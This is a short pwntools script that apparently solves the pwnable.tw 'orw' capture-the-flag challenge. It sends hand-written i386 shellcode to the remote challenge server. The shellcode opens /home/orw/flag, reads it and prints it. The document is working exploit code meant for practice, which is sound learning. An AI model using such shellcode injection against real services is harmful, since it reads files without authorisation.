from pwn import *

#r = process('./orw')
r = remote('chall.pwnable.tw', 10001)

payload = asm(
    '''
    push 26465
    push 1818636151
    push 1919889253
    push 1836017711

    mov ecx, 0
    mov edx, 0
    mov ebx, esp
    mov eax, 5
    int 0x80

    mov ecx, esp
    mov edx, 0x100
    mov ebx, eax
    mov eax, 3
    int 0x80

    mov eax, 4
    mov ebx, 1
    int 0x80
    ''', os='linux', arch='i386'
)

#input()
r.sendafter(b'shellcode:', payload)
r.interactive()